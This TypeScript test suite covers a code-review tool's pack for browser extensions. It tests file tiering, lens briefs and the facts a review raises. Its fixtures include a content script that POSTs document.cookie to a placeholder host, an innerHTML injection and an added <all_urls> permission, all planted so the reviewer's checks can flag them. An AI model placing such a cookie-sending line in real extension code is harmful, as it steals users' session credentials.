import { existsSync } from 'node:fs';
import { mkdir, readdir, readFile, utimes, writeFile } from 'node:fs/promises';
import { basename, join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { FileDiff } from '@airlock/shared';
import { describe, expect, it } from 'vitest';
import { gatherChecks } from '../../src/facts/checks.js';
import { classifyFiles } from '../../src/facts/classify.js';
import { EXTENSION_CHECKS } from '../../src/facts/extension-checks.js';
import { kitCacheRoot } from '../../src/packs/kit-sync.js';
import { loadPack } from '../../src/packs/load.js';
import { choosePacks } from '../../src/pipeline/packs.js';
import { fakeGh, useReviewHarness } from '../helpers/review-scenario.js';

const packsDir = fileURLToPath(new URL('../../../../packs/', import.meta.url));
const dir = join(packsDir, 'extensions');
const extensions = () => loadPack(dir);

const OWNER = 'Moxie-Pest-Control-Phoenix';
const REPOS = ['scheduling-tool-suite', 'termites-tool-suite', 'moxie-click-to-dial', 'isales-audit-tool', 'TI-route-snapshot']
  .map((name) => `${OWNER}/${name}`);
// lens-rules.md is the kit's own agents' operating instructions, not a standard: never attached.
const KIT_FILES = ['standard.md', 'conventions.md', 'calibration.md', 'register.md', 'fieldroutes.md'];

/** A local copy of the extension review kit, when this Mac has one; the comparison with it is skipped otherwise. */
const KIT_COPY = '/Users/moxie/Projects/moxie-ext-review-kit/';
const kitPresent = existsSync(join(KIT_COPY, 'skills/ext-review/standard.md'));

const RUN_WORDS = 8;
/** Every run of `n` consecutive words, lower-cased, apostrophes dropped and other punctuation read as a space. */
function wordRuns(text: string, n = RUN_WORDS): Set<string> {
  const words = text.toLowerCase().replace(/['’]/g, '').replace(/[^a-z0-9]+/g, ' ').trim().split(' ').filter(Boolean);
  const runs = new Set<string>();
  for (let i = 0; i + n <= words.length; i++) runs.add(words.slice(i, i + n).join(' '));
  return runs;
}

async function filesUnder(root: string): Promise<string[]> {
  const out: string[] = [];
  for (const e of await readdir(root, { withFileTypes: true })) {
    const path = join(root, e.name);
    if (e.isDirectory()) out.push(...(await filesUnder(path)));
    else out.push(path);
  }
  return out.sort();
}

const changed = (path: string): FileDiff => ({
  path, oldPath: null, status: 'modified', binary: false, additions: 1, deletions: 0, hunks: [],
});

describe('the Extensions pack', () => {
  it('the pack loads, names five repositories, four lenses and its kit, and every lens file exists', async () => {
    const pack = await extensions();
    expect(pack.id).toBe('extensions');
    expect(pack.title).toBe('Extensions');
    expect(pack.repos).toEqual(REPOS);
    expect(pack.appRoot).toBeNull();
    expect(pack.stageRules).toEqual([{ default: true, stage: 'other' }]);
    expect(pack.kit).toEqual({
      repo: `${OWNER}/moxie-ext-review-kit`,
      files: KIT_FILES.map((f) => `skills/ext-review/${f}`),
      datedStandards: ['skills/ext-review/calibration.md'],
    });
    expect(pack.standards).toEqual([]); // the kit's files are attached at review time, never kept here
    expect(pack.codeChecks).toEqual(Object.keys(EXTENSION_CHECKS));
    expect(pack.checks).toEqual([]);
    expect(pack.lenses.map((l) => [l.id, l.title])).toEqual([
      ['security', 'Security'], ['data', 'Data'], ['office', 'Office'], ['quality', 'Quality'],
    ]);
    const manifest = await readFile(join(dir, 'pack.yaml'), 'utf8');
    for (const id of ['security', 'data', 'office', 'quality']) {
      expect(manifest).toContain(`file: lenses/${id}.md`);
      expect(existsSync(join(dir, 'lenses', `${id}.md`)), id).toBe(true);
    }
  });

  it('an extension repository gets extensions and generic, and an Orbit repository does not get extensions', async () => {
    for (const repo of [...REPOS, `${OWNER}/ti-route-snapshot`, `${OWNER.toUpperCase()}/Moxie-Click-To-Dial`]) {
      const { packs, errors } = await choosePacks(packsDir, repo);
      expect(errors, repo).toEqual([]);
      expect(packs.map((p) => p.id), repo).toEqual(['extensions', 'generic']);
    }
    for (const repo of [`${OWNER}/moxie-portal`, 'vigneshrs-moxie/moxie-portal-vrs']) {
      const ids = (await choosePacks(packsDir, repo)).packs.map((p) => p.id);
      expect(ids, repo).not.toContain('extensions');
      expect(ids, repo).toEqual(['orbit-mine', 'raj-standard', 'generic']);
    }
    expect((await choosePacks(packsDir, `${OWNER}/moxie-ext-review-kit`)).packs.map((p) => p.id)).toEqual(['generic']);
  });

  it('reads the manifest, the scripts and what sends data out, skims the popup and styles, and trusts tests and words for people', async () => {
    const pack = await extensions();
    const generic = await loadPack(join(packsDir, 'generic'));
    const tierOf = (path: string): string => classifyFiles([changed(path)], [pack, generic])[0]!.tier;
    for (const path of [
      'manifest.json', 'background.js', 'content.js', 'bridge-content.js', 'sheets-content.js', 'config.js', 'destinations.js',
      'apps-script/dashboard-receiver.gs', 'route-monitor/TI_Route_Monitor_Receiver_v4.gs', 'route-monitor/manifest.json',
      'route-monitor/background.js', 'coordination.js', 'fetch-helpers.js', 'background.mjs', 'sender-api.cjs', 'content.mjs', '.github/workflows/ext-checks.yml', 'trufflehog-exclude.txt',
    ]) expect(tierOf(path), path).toBe('read');
    for (const path of [
      'popup.html', 'popup.js', 'popup.css', 'styles.css', 'options.html', 'options.js', 'sidepanel.js', 'batch-controller.js',
      'fixtures/inject.js', 'lib/test/sender.js', 'src/fixtures/data.js', 'lib/tests/helper.js', 'icons/logo.svg', 'icons/build.js',
    ]) {
      expect(tierOf(path), path).toBe('skim');
    }
    for (const path of [
      'tests/reminder-policy.test.js', 'tests/run-all.cjs', 'tests/content.js', 'tests/fixtures/manifest.json', 'tests/check.py',
      'README.md', 'CHANGELOG.md', 'PRIVACY.md', 'TEST-CHECKLIST.md', 'apps-script/SETUP.md', 'inject.spec.js', 'icons/icon128.png', 'icons/a/b.webp',
    ]) expect(tierOf(path), path).toBe('trust');
  });

  it('reads closely every changed file the manifest loads, wherever it sits, and trusts a test the manifest does not name', async () => {
    const pack = await extensions();
    const generic = await loadPack(join(packsDir, 'generic'));
    const head = JSON.stringify({
      manifest_version: 3, name: 'Tool', version: '1.0.0', background: { service_worker: 'inject.spec.js' },
      content_scripts: [{ matches: ['https://a.example.com/*'], js: ['fixtures/inject.js', 'tests/hook.js'] }],
    });
    const paths = ['fixtures/inject.js', 'inject.spec.js', 'tests/hook.js', 'lib/test/sender.js', 'tests/real.test.js'];
    const files = paths.map(changed);
    const checked = await gatherChecks(files, [pack, generic], async (p) => (p === 'manifest.json' ? head : null));
    const tiers = classifyFiles(files, [pack, generic], checked);
    expect(tiers.map((t) => [t.path, t.tier, t.reason])).toEqual([
      ['fixtures/inject.js', 'read', 'extensions: loaded by manifest.json'],
      ['inject.spec.js', 'read', 'extensions: loaded by manifest.json'],
      ['tests/hook.js', 'read', 'extensions: loaded by manifest.json'],
      ['lib/test/sender.js', 'skim', 'default'],
      ['tests/real.test.js', 'trust', 'extensions: tests/**'],
    ]);
    // with no manifest to read, no code file is trusted as a test: it is skimmed at least
    const blind = await gatherChecks(files, [pack, generic], async () => null);
    expect(classifyFiles(files, [pack, generic], blind).find((t) => t.path === 'tests/real.test.js'))
      .toEqual({ path: 'tests/real.test.js', tier: 'skim', reason: 'extensions: manifest.json could not be read, so no file is trusted as a test' });
  });

  it('has four lens briefs, each under 40 lines, pointing at the attached standards by name and asking for the whole candidate', async () => {
    const pack = await extensions();
    for (const lens of pack.lenses) {
      const lines = lens.instructions.trimEnd().split('\n').length;
      const words = lens.instructions.split(/\s+/).filter(Boolean).length;
      expect(lines, lens.id).toBeLessThan(40);
      expect(words, lens.id).toBeGreaterThanOrEqual(100);
      expect(words, lens.id).toBeLessThanOrEqual(450);
      const named = [...lens.instructions.matchAll(/`([\w.-]+\.md)`/g)].map((m) => m[1]!);
      expect(named.length, lens.id).toBeGreaterThan(0);
      for (const name of named) expect(KIT_FILES, `${lens.id} names ${name}`).toContain(name);
      for (const name of ['conventions.md', 'standard.md', 'calibration.md']) expect(lens.instructions, lens.id).toContain(`\`${name}\``);
      expect(lens.instructions, lens.id).toMatch(/suggested change/);
      expect(lens.instructions, lens.id).toMatch(/^Not this lens:/m);
      expect(lens.instructions, lens.id).not.toMatch(/lens-rules/);
    }
  });

  // A net for copied text, not for paraphrase (the review is for that). Repository names and file paths (`owner/name`,
  // `skills/ext-review/standard.md`) are names, not sentences: left out.
  const COPY_TEST = 'no lens brief shares a sentence of eight words or more with a kit file, lenses.md or the kit\'s agent prompts';
  it.skipIf(!kitPresent)(kitPresent ? COPY_TEST : `${COPY_TEST} (skipped: no copy of the extension review kit at ${KIT_COPY})`, async () => {
    const kitRuns = new Set<string>();
    const compared: string[] = [];
    for (const sub of ['skills/ext-review', 'agents']) {
      if (!existsSync(join(KIT_COPY, sub))) continue;
      for (const path of await filesUnder(join(KIT_COPY, sub))) {
        if (!path.endsWith('.md')) continue;
        compared.push(relative(KIT_COPY, path));
        for (const run of wordRuns(await readFile(path, 'utf8'))) kitRuns.add(run);
      }
    }
    expect(compared).toContain('skills/ext-review/lenses.md');
    expect(compared.filter((p) => p.startsWith('agents/')).length).toBeGreaterThan(0);
    expect(kitRuns.size).toBeGreaterThan(0);
    const shared: string[] = [];
    for (const path of await filesUnder(dir)) {
      const text = (await readFile(path, 'utf8')).replace(/\S+\/\S+/g, ' ');
      for (const run of wordRuns(text)) if (kitRuns.has(run)) shared.push(`${relative(dir, path)}: ${run}`);
    }
    expect(shared).toEqual([]);
  });
});

describe('a review with the Extensions pack', () => {
  const { home, scenario, review } = useReviewHarness();

  it("runs the pack's code checks on the pull request's base and head, with the kit from the cache", async () => {
    const pack = await extensions();
    // A cached copy of the kit stands in for GitHub, which the tests never reach.
    expect(home()).not.toBe('');
    const cached = join(kitCacheRoot(pack.kit!), 'e'.repeat(40));
    await mkdir(cached, { recursive: true });
    for (const name of KIT_FILES) await writeFile(join(cached, name), `# ${basename(name, '.md')}\n`);
    await utimes(cached, new Date('2026-11-01T12:00:00Z'), new Date('2026-11-01T12:00:00Z'));

    const manifest = (version: string, hosts: string[]): string =>
      `${JSON.stringify({ manifest_version: 3, name: 'Tool', version, host_permissions: hosts }, null, 2)}\n`;
    const s = await scenario(
      { 'manifest.json': manifest('1.0.0', ['https://*.pestroutes.com/*']), 'content.js': 'console.log("hi");\n' },
      { 'manifest.json': manifest('1.1.0', ['https://*.pestroutes.com/*', '<all_urls>']), 'content.js': 'document.body.innerHTML = note;\n' },
    );
    const { doc } = await review({ s, req: { packsDir, packIds: ['extensions'], kitDir: undefined }, exec: fakeGh({ baseSha: s.baseSha, headSha: s.headSha }) });
    expect(doc.packs.map((p) => p.id)).toEqual(['extensions']);
    expect(doc.questions.map((q) => q.text)).toContain(
      `The review kit ${OWNER}/moxie-ext-review-kit could not be refreshed; the copy from 2026-11-01 was used.`);
    expect(doc.facts.map((f) => `${f.checkId} ${f.path}${f.line === null ? '' : `:${f.line}`}`)).toEqual([
      'extension-permissions manifest.json',
      'extension-broad-hosts manifest.json:7',
      'extension-version-changelog manifest.json',
      'extension-html-injection content.js:1',
    ]);
    expect(doc.facts[0]!.message).toBe(
      'host_permissions before: https://*.pestroutes.com/*; after: https://*.pestroutes.com/*, <all_urls>; added: <all_urls>.');
  }, 60_000);

  it('a pull request that only changes a file under tests/ that the manifest loads is read by the lenses', async () => {
    const pack = await extensions();
    const cached = join(kitCacheRoot(pack.kit!), 'e'.repeat(40));
    await mkdir(cached, { recursive: true });
    for (const name of KIT_FILES) await writeFile(join(cached, name), `# ${basename(name, '.md')}\n`);
    const manifest = `${JSON.stringify({ manifest_version: 3, name: 'Tool', version: '1.0.0', content_scripts: [{ matches: ['https://a.example.com/*'], js: ['tests/inject.js'] }] }, null, 2)}\n`;
    const s = await scenario(
      { 'manifest.json': manifest, 'tests/inject.js': 'const a = 1;\n' },
      { 'tests/inject.js': 'const a = 1;\nfetch("https://a.example.com/x", { method: "POST", body: document.cookie });\n' },
    );
    const { doc, calls } = await review({ s, req: { packsDir, packIds: ['extensions'], kitDir: undefined }, exec: fakeGh({ baseSha: s.baseSha, headSha: s.headSha }) });
    expect(doc.files).toEqual([{ path: 'tests/inject.js', tier: 'read', reason: 'extensions: loaded by manifest.json' }]);
    expect(doc.facts.map((f) => f.message)).toContain('tests/inject.js sits under a test or fixture folder but the extension loads it.');
    expect(calls.some((c) => c.role.startsWith('lens'))).toBe(true);
  }, 60_000);
});
